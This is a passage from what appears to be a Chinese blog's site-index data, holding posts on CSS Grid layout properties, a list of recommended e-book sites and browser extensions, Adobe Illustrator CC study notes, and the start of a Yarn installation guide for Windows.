} {% endcodeblock %}\n它等价于：\n{% codeblock lang:css %} .container{ grid-template-columns: 20px [col-start] 20px [col-start] 20px [col-start] 5%; } {% endcodeblock %}\nfr单位允许你将网格容器中的自由空间设置为一个份数，举个例子，下面的例子将把网格容器的每个子项设置为三分之一。\n{% codeblock lang:css %} .container{ grid-template-columns: 1fr 1fr 1fr; } {% endcodeblock %}\n自由空间是在所有固定项确定后开始计算的，在下面的例子中自由空间是fr单位的总和但不包括50px：\n{% codeblock lang:css %} .container{ grid-template-columns: 1fr 50px 1fr 1fr; } {% endcodeblock %}\ngrid-template-areas 通过引用在grid-area属性中指定的网格区域名字来定义网格模板。重复网格区域的名字将让内容跨越那些单元。一个句点表示一个空单元，语法本身提供了一个可视化的结构网格。\n值有：\n \u0026lt;grid-area-name\u0026gt; - 在grid-area中指定的网格区域名字 . - 一个句点表示一个空的网格单元 none - 没有网格区域被定义  {% codeblock lang:css %} .container{ grid-template-areas: \u0026ldquo; | . | none | \u0026hellip;\u0026rdquo; \u0026ldquo;\u0026hellip;\u0026rdquo; } {% endcodeblock %}\n举个例子：\n{% codeblock lang:css %} .item-a{ grid-area: header; } .item-b{ grid-area: main; } .item-c{ grid-area: sidebar; } .item-d{ grid-area: footer; }\n.container{ grid-template-columns: 50px 50px 50px 50px; grid-template-rows: auto; grid-template-areas: \u0026ldquo;header header header header\u0026rdquo; \u0026ldquo;main main . sidebar\u0026rdquo; \u0026ldquo;footer footer footer footer\u0026rdquo; } {% endcodeblock %}\n这将创建一个 4 乘以 3 的网格，第一行由header区域组成，中间一行由 2 个main区域和一个空单元和一个sidebar区域组成，最后一行由footer区域组成。\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-template-areas.png %}\n在你定义的每一行都需要拥有相同的单元格。\n你可以使用任意毗邻的阶段来声明一个单独的空单元，只要这些阶段中间没有空间都可以认为是一个单独的单元。\n注意，在这里你的语法只是命名了区域但没有对网格线进行命名，当你使这种语法时，区域任意一边的线会被自动命名。如果你的网格区域的名字是foo，然么网格的开始行和开始列网格线的名字将会是foo-start，并且它的最后一行和最后一列的网格线名字是foo-end。这意味着一些网格线可能有多个名字，比如上面那个例子中最左边的线，它会有三个名字分别是：header-start，main-start，footer-start。\ngrid-column-gap grid-row-gap 指定网格线的大小，你可以认为它就是设置行和列中间沟槽的宽度。\n值有：\n \u0026lt;line-size\u0026gt; - 一个长度值  {% codeblock lang:css %} .container{ grid-column-gap: ; grid-row-gap: ; } {% endcodeblock %}\n举例：\n{% codeblock lang:css %} .container{ grid-template-columns: 100px 50px 100px; grid-template-rows: 80px auto 80px; grid-column-gap: 10px; grid-row-gap: 15px; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-column-row-gap.png %}\n只会创建行和列的沟槽，不包括边缘。\ngrid-gap 一个grid-column-gap + grid-row-gap的简称。\n值有：\n \u0026lt;grid-column-gap\u0026gt;、\u0026lt;grid-row-gap\u0026gt; - 长度值  {% codeblock lang:css %} .container{ grid-gap:  ; } {% endcodeblock %}\n举例：\n{% codeblock lang:css %} .container{ grid-template-columns: 100px 50px 100px; grid-template-rows: 80px auto 80px; grid-gap: 10px 15px; } {% endcodeblock %}\n如果没有写grid-row-gap，那么它的值将和grid-column-gap的一样。\njustify-items 让网格子项的内容和列轴对齐（align-items则相反，是和行轴对齐），这个值对容器里面的所有网格子项都有用。\n值有：\n start - 内容和网格区域的左边对齐 end - 内容和网格区域的右边对齐 center - 内容和网格区域的中间对齐 stretch - 填充整个网格区域的宽度（默认值）  {% codeblock lang:css %} .container{ justify-items: start | end | center | stretch; } {% endcodeblock %}\n举例：\n{% codeblock lang:css %} .container{ justify-items: start; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-items-start.png %}\n{% codeblock lang:css %} .container{ justify-items: end; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-items-end.png %}\n{% codeblock lang:css %} .container{ justify-items: center; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-items-center.png %}\n{% codeblock lang:css %} .container{ justify-items: stretch; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-items-stretch.png %}\n可以通过justify-self属性把这个行为设置到单独的网格子项。\nalign-items 让网格子项的内容和行轴对齐（justify-items则相反，是和列轴对齐），这个值对容器里面的所有网格子项都有用。\n值有：\n start - 内容和网格区域的上边对齐 end - 内容和网格区域的下边对齐 center - 内容和网格区域的中间对齐 stretch - 填充整个网格区域的高度（默认值）  {% codeblock lang:css %} .container{ align-items: start | end | center | stretch; } {% endcodeblock %}\n举例：\n{% codeblock lang:css %} .container{ align-items: start; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-items-start.png %}\n{% codeblock lang:css %} .container{ align-items: end; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-items-end.png %}\n{% codeblock lang:css %} .container{ align-items: center; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-items-center.png %}\n{% codeblock lang:css %} .container{ align-items: stretch; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-items-stretch.png %}\n可以通过align-self属性把这个行为设置到单独的网格子项。\njustify-content 有时候你的网格总大小可能会比它的网格容器的容量小，这可能是你的所有网格子项都使用了固定值比如px来确定大小，在这个情况下你可以在网格容器中设置网格的对齐方式。这个属性将网格和列轴对齐（和align-content相反，它是和行轴对齐）。\n值有：\n start - 网格在网格容器左边对齐 end - 网格在网格容器右边对齐 center - 网格在网格容器中间对齐 stretch - 改变网格子项的容量让其填充整个网格容器宽度 space-around - 在每个网格子项中间放置均等的空间，在始末两端只有一半大小 space-between - 在每个网格子项中间放置均等的空间，在始末两端没有空间 space-evenly - 在每个网格子项中间放置均等的空间，包括始末两端  {% codeblock lang:css %} .container{ justify-content: start | end | center | stretch | space-around | space-between | space-evenly; } {% endcodeblock %}\n举例：\n{% codeblock lang:css %} .container{ justify-content: start; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-content-start.png %}\n{% codeblock lang:css %} .container{ justify-content: end; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-content-end.png %}\n{% codeblock lang:css %} .container{ justify-content: center; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-content-center.png %}\n{% codeblock lang:css %} .container{ justify-content: stretch; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-content-stretch.png %}\n{% codeblock lang:css %} .container{ justify-content: space-around; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-content-space-around.png %}\n{% codeblock lang:css %} .container{ justify-content: space-between; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-content-space-between.png %}\n{% codeblock lang:css %} .container{ justify-content: space-evenly; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-content-space-evenly.png %}\nalign-content 有时候你的网格总大小可能会比它的网格容器的容量小，这可能是你的所有网格子项都使用了固定值比如px来确定大小，在这个情况下你可以在网格容器中设置网格的对齐方式。这个属性将网格和行轴对齐（和justify-content相反，它是和列轴对齐）。\n值有：\n start - 网格在网格容器上边对齐 end - 网格在网格容器下边对齐 center - 网格在网格容器中间对齐 stretch - 改变网格子项的容量让其填充整个网格容器高度 space-around - 在每个网格子项中间放置均等的空间，在始末两端只有一半大小 space-between - 在每个网格子项中间放置均等的空间，在始末两端没有空间 space-evenly - 在每个网格子项中间放置均等的空间，包括始末两端  {% codeblock lang:css %} .container{ align-content: start | end | center | stretch | space-around | space-between | space-evenly; } {% endcodeblock %}\n{% codeblock lang:css %} .container{ align-content: start; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-content-start.png %}\n{% codeblock lang:css %} .container{ align-content: end; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-content-end.png %}\n{% codeblock lang:css %} .container{ align-content: center; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-content-center.png %}\n{% codeblock lang:css %} .container{ align-content: stretch; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-content-stretch.png %}\n{% codeblock lang:css %} .container{ align-content: space-around; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-content-space-around.png %}\n{% codeblock lang:css %} .container{ align-content: space-between; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-content-space-between.png %}\n{% codeblock lang:css %} .container{ align-content: space-evenly; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-content-space-evenly.png %}\ngrid-auto-columns grid-auto-rows 指定自动生成的网格轨道的大小（又叫隐式网格轨道），当你精确指定行和列的位置大于定义的网格（通过 grid-template-rows/grid-template-columns）时隐式网格轨道会被创建。\n值有：\n \u0026lt;track-size\u0026gt; - 可以是一个长度，百分比或者是一个网格中自由空间的份数（通过使用fr单位）。  {% codeblock lang:css %} .container{ grid-auto-columns:  \u0026hellip;; grid-auto-rows:  \u0026hellip;; } {% endcodeblock %}\n为了说明隐式网格轨道如何被创建，思考一下这个：\n{% codeblock lang:css %} .container{ grid-template-columns: 60px 60px; grid-template-rows: 90px 90px } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-auto.png %}\n这里创建了 2 x 2 的网格。\n但现在想象你使用grid-column和grid-row来定位你的网格项，就像这样：\n{% codeblock lang:css %} .item-a{ grid-column: 1 / 2; grid-row: 2 / 3; } .item-b{ grid-column: 5 / 6; grid-row: 2 / 3; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/implicit-tracks.png %}\n我们告诉.item-b在第 5 列网格线开始第 6 列网格线结束，但我们还没有定义第 5 或者第 6 列。因为我们引用的线不存在，0 宽度的隐式网格轨道将被创建来填充这些空缺。我们可以使用grid-auto-columns和grid-auto-rows来指定这些隐式网格轨道的宽度：\n{% codeblock lang:css %} .container{ grid-auto-columns: 60px; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/implicit-tracks-with-widths.png %}\ngrid-auto-flow 如果你有网格项没有明确地放置在网格中，自动布局算法会将网格项自动放置起来，这个属性控制自动布局算法如何工作。\n值有：\n row - 告诉自动布局算法在每一行中依次填充，必要时添加新行 column - 告诉自动布局算法在每一列中依次填充，必要时添加新列 dense - 告诉自动布局算法如果更小的子项出现时尝试在网格中填补漏洞  {% codeblock lang:css %} .container{ grid-auto-flow: row | column | row dense | column dense } {% endcodeblock %}\n注意dense可能让你的网格子项出现错乱。\n举个例子：\n考虑一下这个 HTML：\n{% codeblock lang:html %} item-a item-b item-c item-d item-e  {% endcodeblock %}\n你定义一个 5 列 2 行的网格，并设置grid-auto-flow为row（这也是默认值）：\n{% codeblock lang:css %} .container{ display: grid; grid-template-columns: 60px 60px 60px 60px 60px; grid-template-rows: 30px 30px; grid-auto-flow: row; } {% endcodeblock %}\n当在网格中放置子项时，你只能为其中 2 个指定斑点：\n{% codeblock lang:css %} .item-a{ grid-column: 1; grid-row: 1 / 3; } .item-e{ grid-column: 5; grid-row: 1 / 3; } {% endcodeblock %}\n因为我们设置grid-auto-flow为row，我们的网格看起来就像这样，注意这三个我们没有放置的子项（item-b，item-c，item-d）将如何以行的方式流动的：\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-auto-flow-row.png %}\n如果我们将grid-auto-flow设为column，item-b，item-c和item-d以列的方式向下流动：\n{% codeblock lang:css %} .container{ display: grid; grid-template-columns: 60px 60px 60px 60px 60px; grid-template-rows: 30px 30px; grid-auto-flow: column; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-auto-flow-column.png %}\ngrid 以下属性的简写方式：grid-template-rows，grid-template-columns，grid-template-areas，grid-auto-rows，grid-auto-columns，grid-auto-flow。它也可以设置grid-column-gap和grid-row-gap为它们的初始值，尽管它们不能通过这个属性来精确设置。 值有：\n none - 设置所有子属性为它们的初始值 \u0026lt;grid-template-rows\u0026gt; / \u0026lt;grid-template-columns\u0026gt; - 分别设置grid-template-rows和grid-template-columns的指定值，以及设置其他所有子属性为初始值 \u0026lt;grid-auto-flow\u0026gt; [\u0026lt;grid-auto-rows\u0026gt; [ / \u0026lt;grid-auto-columns\u0026gt;] ] - 分别接收所有像grid-auto-flow，grid-auto-rows和grid-auto-columnsaccepts的相同值。如果grid-auto-columns被省略了，那么它的值会通过grid-auto-rows来设置，如果两个都省略了，它们将被设置为默认值。  {% codeblock lang:css %} .container{ grid: none |  /  |  [ [/ ]]; } {% endcodeblock %}\n举例：\n下面 2 段代码是相等的：\n{% codeblock lang:css %} .container{ grid: 200px auto / 1fr auto 1fr; } {% endcodeblock %}\n{% codeblock lang:css %} .container{ grid-template-rows: 200px auto; grid-template-columns: 1fr auto 1fr; grid-template-areas: none; } {% endcodeblock %}\n下面这 2 段代码也是等价的：\n{% codeblock lang:css %} .container{ grid: column 1fr / auto; } {% endcodeblock %}\n{% codeblock lang:css %} .container{ grid-auto-flow: column; grid-auto-rows: 1fr; grid-auto-columns: auto; } {% endcodeblock %}\n它也可以接收一个更复杂但又相当方便的语法来一次性设置所有属性，你可以指定grid-template-areas，grid-auto-rows和grid-auto-columns，并且所有其他子属性被设置为它们的默认值。你需要做的是指定网格线的名称和网格轨迹的大小来生成它们的网格区域。最简单的表述方法就是举一个例子：\n{% codeblock lang:css %} .container{ grid: [row1-start] \u0026ldquo;header header header\u0026rdquo; 1fr [row1-end] [row2-start] \u0026ldquo;footer footer footer\u0026rdquo; 25px [row2-end] / auto 50px auto; } {% endcodeblock %}\n上面跟下面是等价的：\n{% codeblock lang:css %} .container{ grid-template-areas: \u0026ldquo;header header header\u0026rdquo; \u0026ldquo;footer footer footer\u0026rdquo;; grid-template-rows: [row1-start] 1fr [row1-end row2-start] 25px [row2-end]; grid-template-columns: auto 50px auto; } {% endcodeblock %}\n网格项的属性  grid-column-start grid-column-end grid-row-start grid-row-end grid-column grid-row grid-area justify-self align-self  grid-column-start、grid-column-end、grid-row-start 和 grid-row-end 通过参考指定的网格线来决定网格中一个网格项的位置，grid-column-start/grid-row-start是指网格子项开始的线，grid-column-end/grid-row-end是指网格项结束的线。\n值有：\n \u0026lt;line\u0026gt; - 可以是一个数字以适用被标记了数字号的网格线，或者是一个名字以适用命名了的网格线 span \u0026lt;number\u0026gt; - 子项将跨越指定数字的网格轨道 span \u0026lt;name\u0026gt; - 子项将跨越到指定名字之前的网格线 auto - 表示自动布局，自动跨越或者默认跨越一个  {% codeblock lang:css %} .item{ grid-column-start:  |  | span  | span  | auto grid-column-end:  |  | span  | span  | auto grid-row-start:  |  | span  | span  | auto grid-row-end:  |  | span  | span  | auto } {% endcodeblock %}\n举个例子：\n{% codeblock lang:css %} .item-a{ grid-column-start: 2; grid-column-end: five; grid-row-start: row1-start grid-row-end: 3 } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-start-end-a.png %}\n{% codeblock lang:css %} .item-b{ grid-column-start: 1; grid-column-end: span col4-start; grid-row-start: 2 grid-row-end: span 2 } {% endcodeblock %}\n{% img http://chris.house/images/grid-start-end-b.png %}\n如果grid-column-end/grid-row-end没有生命，网格项将默认跨越一个网格轨道。\n网格项可以互相重叠，你可以使用z-index来控制他们的层叠顺序。\ngrid-column与grid-row grid-column-start + grid-column-end，和grid-row-start + grid-row-end的简写，分别独立。\n值有：\n  /  - 每一个属性都可以接收普通模式的值，包括span  {% codeblock lang:css %} .item{ grid-column:  /  |  / span ; grid-row:  /  |  / span ; } {% endcodeblock %}\n举例：\n{% codeblock lang:css %} .item-c{ grid-column: 3 / span 2; grid-row: third-line / 4; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-start-end-c.png %}\n如果没有声明结束网格线的值，那么网格子项将默认跨越 1 个网格轨迹。\ngrid-area 给网格项取一个名字以让它被由grid-template-areas属性创建的模板引用。同时，这个属性也可以用来更简短地表示grid-row-start+ grid-column-start + grid-row-end+ grid-column-end。\n值有：\n \u0026lt;name\u0026gt; - 一个你选择的名字 \u0026lt;row-start\u0026gt; / \u0026lt;column-start\u0026gt; / \u0026lt;row-end\u0026gt; / \u0026lt;column-end\u0026gt; - 可以是网格线的数字或名字  {% codeblock lang:css %} .item{ grid-area:  |  /  /  / ; } {% endcodeblock %}\n举例：\n作为分配一个名字给网格项的一种方式：\n{% codeblock lang:css %} .item-d{ grid-area: header } {% endcodeblock %}\n作为grid-row-start+ grid-column-start + grid-row-end+ grid-column-end的一种简写：\n{% codeblock lang:css %} .item-d{ grid-area: 1 / col4-start / last-line / 6 } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-start-end-d.png %}\njustify-self 让网格项的内容以列轴对齐（与之相反align-self是跟行轴对齐），这个值可以应用在单个网格项的内容中。\n值有：\n start - 让内容在网格区域左对齐 end - 让内容在网格区域右对齐 center - 让内容在网格区域中间对齐 stretch - 填充整个网络区域的宽度（默认值）  {% codeblock lang:css %} .item{ justify-self: start | end | center | stretch; } {% endcodeblock %}\n举例：\n{% codeblock lang:css %} .item-a{ justify-self: start; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-self-start.png %}\n{% codeblock lang:css %} .item-a{ justify-self: end; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-self-end.png %}\n{% codeblock lang:css %} .item-a{ justify-self: center; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-self-center.png %}\n{% codeblock lang:css %} .item-a{ justify-self: stretch; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-justify-self-stretch.png %}\n为了让网格中的所有项都对齐，这个行为也可以通过设置网格容器中的justify-items属性来实现。\nalign-self 让网格项的内容以行轴对齐（与之相反justify-self是跟列轴对齐），这个值可以应用在单个网格项的内容中。\n值有：\n start - 让内容在网格区域上对齐 end - 让内容在网格区域下对齐 center - 让内容在网格区域中间对齐 stretch - 填充着呢个网络区域的高度（默认值）  {% codeblock lang:css %} .item{ align-self: start | end | center | stretch; } {% endcodeblock %}\n举例：\n{% codeblock lang:css %} .item-a{ align-self: start; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-self-start.png %}\n{% codeblock lang:css %} .item-a{ align-self: end; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-self-end.png %}\n{% codeblock lang:css %} .item-a{ align-self: center; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-self-center.png %}\n{% codeblock lang:css %} .item-a{ align-self: stretch; } {% endcodeblock %}\n{% img https://cdn.css-tricks.com/wp-content/uploads/2016/03/grid-align-self-stretch.png %}\n为了让网格中的所有项都对齐，这个行为也可以通过设置网格容器中的align-items属性来实现。\n","permalink":"http://localhost:8000/public/post/css-grid-%E7%BD%91%E6%A0%BC%E5%B8%83%E5%B1%80%E5%AE%8C%E6%95%B4%E4%BB%8B%E7%BB%8D/","tags":["css","grid"],"title":"css grid 网格布局完整介绍"},{"categories":["学习笔记"],"contents":"  📌 推荐一些实用的好资源\n 电子书籍    网站 推荐星级 标签     Readfree ⭐️⭐️⭐️⭐️⭐️ 中文/英文、种类多、数量全、有评分、有介绍、活跃度高、需登录   All IT eBooks ⭐️⭐️⭐️⭐️⭐️ 英文、分类全、PDF、高质量   1Bookcase ⭐️⭐️⭐️ 英文、高质量、有介绍、数量较少、有广告   ITBooks ⭐️⭐️⭐️ 中文/英文、高质量、有介绍、数量较少   ePUBee ⭐️⭐️⭐️ 中文/英文、种类多    浏览器插件  阅读辅助类：\n 简阅 Twinword Finder Multi-highlight Beanote - Note Taking on Web Pages 沙拉查词-网页划词翻译 Reading list，同类还有阅读列表 Screen Shader - F.lux for Chrome  管理工具类\n Click \u0026amp; Clean Infinity AdGuard，同类还有uBlock Origin Tampermonkey 二管家 \u0026gt; 同为扩展管理工具的还有： Extension Manager、Extensity、扩展管理、Simple Ext Manager、一键管理、快捷扩展管理 下载+、Video Downloader Pro 二维码生成及识别 短网址二维码生成器 书签侧边栏 \u0026gt; 同为书签管理工具的还有： Bookmarks Hotlist、Popup my Bookmarks、Bookmarks  开发工具\n Web Maker Header Editor WEB前端助手/FeHelper Css3Animation GitZip for github EditThisCookie AlloyDesigner LibSniffer Servistate HTTP Editor \u0026amp; REST API Client Color Hunt css-peeper dimensions perfectpixel-by-welldonecode  消息阅读类\n inoreader Panda 5 | News \u0026amp; Inspiration Dashboard 掘金 Muzli 2 - Stay Inspired   ","permalink":"http://localhost:8000/public/post/%E4%BC%98%E8%B4%A8%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86%E6%94%B6%E8%97%8F/","tags":["收藏","分享"],"title":"优质资源整理收藏"},{"categories":["学习笔记"],"contents":" 视频资料Illustrator CC实例教程-我要自学网，里面都是满满的干货，非常受用。\n Adobe Illustrator CC 介绍 Adobe Illustrator CC 是矢量图软件，而 Photoshop CC 是位图软件。矢量图可以无损缩放，体积也很小，但不适用于色彩复杂的图形创作。\n\n软件的基本操作方法 创建项目时，有两种颜色模式：RGB（红绿蓝-白，色光三原色、加法三原色）、CMYK（青品红黄-黑，色料三原色、减法三原色、印刷四分色）\n\u0026ldquo;存储为\u0026rdquo;与\u0026rdquo;导出\u0026rdquo;操作，可以导出为多种格式的文件。常用的有：jpg（有损）、tif（无损）、png（透明）、psd（图层）、pdf(一个项目中有多个画板时，导出成pdf格式，会存储在一个pdf文档中)。\n*选择工具*与*直接选择工具*的区别 共有 1. 多边形圆角化（鼠标左键拖动尖角内靠近的带圆心的小圆圈）； 2. 快速复制（鼠标左键+ Art拖动图形）； 3. 移动； 3. 框选； 4. 右键选项一样（变换与再次变换(Ctrl+D)很方便）。\n选择工具 主要针对整体 鼠标左键可以实施的操作：缩放（+ Shift等比缩放）、旋转；不方便操作锚点。\n直接选择工具 主要针对锚点 分割锚点: 选择图像 \u0026rArr; 选择锚点 \u0026rArr; 点击上方菜单栏中的分割锚点图标 \u0026rArr; 然后拖动线条，就分开了 ； 连接锚点: 框选住（或者用套索工具套索住）两个分开的锚点 \u0026rArr; 点击上方菜单栏中的连接锚点图标； \u0026gt;注意：将图片放大(Art+鼠标上滚)后，操作锚点更准确快速\n拖拉锚点: 选中锚点后拖拉，使图像变形。\n标准图像的绘制  矩形工具 圆角矩形（直接鼠标左键拖动后，仍按住左键不放，同时按住方向上/左/右可以调整圆角半径大小） 椭圆工具 多边形工具（点击+输入方法绘制，可设置边数；边数达到一定数时相当于圆形；n条边就有n个锚点） 星形工具（点击+输入方法绘制，可设置边角数；绘制爆炸图形） 光晕工具（选取部分可以模拟眼睛形状）  普通绘制方式有两种：点击+输入、直接鼠标左键拖动。 对于这两种方式而言，都是从点击点开始，从左至右、从上至下绘制，不方便绘制同心图形。\n正多边形或圆的绘制：借助辅助键Shift\n同心图形的绘制：鼠标移至上个图形的几何中心 \u0026rArr; Art+鼠标左/右键拖动。所以要画同心圆就需要用到Art+Shift+鼠标左/右键拖动。 \u0026gt; (Ctrl + C - Ctrl + F)可以将复制的元素粘贴在原位置;按住Art缩放可以以中心为定点缩放。\n钢笔工具（主要用于描线绘图）  钢笔工具[钢笔+星号] 添加锚点工具[钢笔+加号] 删除锚点工具[钢笔+减号] 锚点工具[尖角号]（锚点的手柄即切线）  钢笔工具 钢笔工具+辅助键Art,可以临时切换到锚点工具，松开Art后又会自动回到钢笔工具；\n钢笔工具画线有两种方式，分别对应直线与曲线。 1. 直线：点击鼠标(取一个端点) \u0026rArr; 松开鼠标 \u0026rArr; 拖动鼠标 \u0026rArr; 点击鼠标(取一个终点)； 2. 曲线：点击鼠标(取一个端点) \u0026rArr; 松开鼠标 \u0026rArr; 点击鼠标拖动(点击取一个切点，拖动取的是切线方向) \u0026rArr; 点击鼠标(取一个终点)或者继续点击鼠标拖动；\n上色： 描线绘图的上色需要用到实时上色工具（K）与实时上色选择工具Shift+L。 \u0026gt;用选择工具选择需要上色的描绘图 \u0026rArr; [顶部菜单栏-对象-实时上色-建立]Ctrl+Alt+X \u0026rArr; 调用左侧菜单中的实时上色工具或实时上色选择工具操作；也可以省掉建立实时上色而直接调用实时上色工具（因为它会自动帮我们建立实时上色）。\n路径菜单[顶部菜单栏-对象-路径]  一旦对闭合路径上色，则这个区域就成为了面，之前的路径就成了现在这个面的边。未上色前，可以在路径内部区域实施框选操作，而上色后则无法实施框选操作（点击拖动变成了移动面的操作）。此时要想只选择部分线条或锚点，则只有套索工具可以完成了。\n  连接（只能连接同意路径或两个不同路径的两个端点） 平均  水平 垂直 两者均有（可以将多个锚点拉伸集中到一个点）  轮廓化描边（执行后，放大可以看到路径或图形边界的外部又有了一个边界路径；结合曲率工具Shift + ~可以拉拽出漂亮的图形） 偏移路径（按照现有路径或图形的形状，在其轮廓外画出一条与之隔有一定距离的闭合路径。与轮廓化描边比较类似。）很方便有两条垂直交叉直线画出一个空心十字架哦 简化（减少锚点） 添加锚点（对于所有直线，均匀的添加锚点） 移去锚点（用的少） 分割下方对象（对一条贯穿闭合路径或图像的路径实施此操作，可以将闭合路径或图像分割成两部分。例子：由正方形画七巧板） 分割成网格  直线工具箱与描边窗口  直线段工具 直线的绘制方式也有两种：点击+输入、直接鼠标左键拖动。前者可以更精确的确定长度及倾斜角度。  所有的线或路径都可以在描边窗口中调整线的粗细、虚实、箭头、端点与边角的形状、外观、渐变等等。描边窗口可在右侧菜单栏的三横杠图标调出，也可在顶部菜单栏 \u0026rArr; 窗口 \u0026rArr; 描边窗口找到。\n 弧形、螺线形、矩形网格工具、极坐标工具  绘制网格有两种方法： 1. 矩形网格工具：是由线段组成的网格。 2. 路径\u0026ndash;分割为网格：是由小矩形块组成的网格。（用于标准制图的网格用该方法来绘制）\n画笔工具 可以置入图片(注意置入时把链接单选框取消)来自建画笔，也可以用项目内创建的图形来自建画笔。\n基本绘图 路径查找器的使用【在LOGO设计中很重要】 路径查找器（窗口-路径查找器）主要用来做两个或多个路径或图形的剪裁、合并、拼接等等。 1. 形状模式 * 联集（合并） * 交集 * 差集 * 减去顶层(沿顶层边缘裁去顶层) 前三种模式都是取顶层的颜色为操作后的颜色。\n2.路径查找器 * 分割（分割后，取消编组，就可以分离了） * 合并（可以很快就做出空心十字架） * 修边 * 剪裁（与交集的区别在于留取了顶层图形的差集部分，只是将它的颜色去掉了） * 轮廓 * 减去后方对象(沿底层边缘裁去底层)\n渐变颜色的使用  类型（线性、径向） 角度 渐变滑块  删减：在渐变条的下边缘点击，可以添加渐变滑块；按住渐变滑块向下甩，可以删除它。 控制面板：双击渐变滑块，可以调出它的控制面板。 不透明度 颜色：灰度、HSB、RGB、CMKL、Web安全RGB 色板    相关: Adobe Animate CC 2017 入门教程——Animate动画案例教程\n","permalink":"http://localhost:8000/public/post/adobe-illustrator-cc-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","tags":["Illustrator"],"title":"Adobe Illustrator CC 学习笔记"},{"categories":["学习笔记"],"contents":"新手指南 Yarn 对你的代码来说是一个包管理器， 你可以通过它使用全世界开发者的代码，或者分享自己的代码。 Yarn 做这些快捷、安全、可靠，所以你不用担心什么。\n通过Yarn你可以使用其他开发者针对不同问题的解决方案，使自己的开发过程更简单。 使用过程中遇到问题，你可以将其上报或者贡献解决方案。一旦问题被修复，Yarn会更新保持同步。\n代码通过包（package）（或者称为模块（module））的方式来共享。 一个包里包含所有需要共享的代码，以及描述包信息的文件，称为package.json。\n\n安装  稳定版：v1.3.2 Node.js版本：^4.8.0 || ^5.7.0 || ^6.2.2 || ^8.0.0\n 在你使用 Yarn 之前，你需要先在系统中安装它。有一些不同的方法（还在增加）安装 Yarn：\nwindows 中如何安装 在 Windows 系统中安装 Yarn 有多种方法\n 方法一：直接下载安装程序安装  这将给你一个.msi 文件(下载安装程序)，当你运行它时带领你安装 Yarn 到 Windows 上。\n前提，你需要先安装 Node.js。\n 方法二：用 Chocolatey 安装  Chocolatey 是一个适用于 Windows 的包管理器，您可以用这个*操作方式*安装。\n如果你已经安装了 Chocolatey，你可以在你的控制台里运行下面的指令安装 yarn：\nchoco install yarn  同样的，你需要确保先安装了 Node.js。\n 方法三：通过 Scoop 安装  Scoop 是一个 Windows 的命令行安装程序，你可以用这些指令安装 Scoop。\n安装好了 Scoop 后，你可以在控制台里运行下面的代码安装 yarn：\nscoop install yarn  如果之前没有安装 Node.js，scoop 将给你一个建议来安装它。 例如：\nscoop install nodejs   方法四(备选)：通过 npm 安装   注意：一般来说, 不推荐通过 npm 安装 Yarn 在用基于 Node 的包管理器安装 Yarn 时，该包未被签名，并且只通过基本的 SHA1 散列进行唯一完整性检查。 这在安装系统级应用时有安全风险。\n因为这些原因，高度推荐用你的操作系统最适合的方式来安装 Yarn。\n 你还可以通过 npm package manager 来安装 Yarn。 如果你已经装了Node.js，那你应该已经有 npm 了。 安装好 npm 后你可以用如下命令来安装 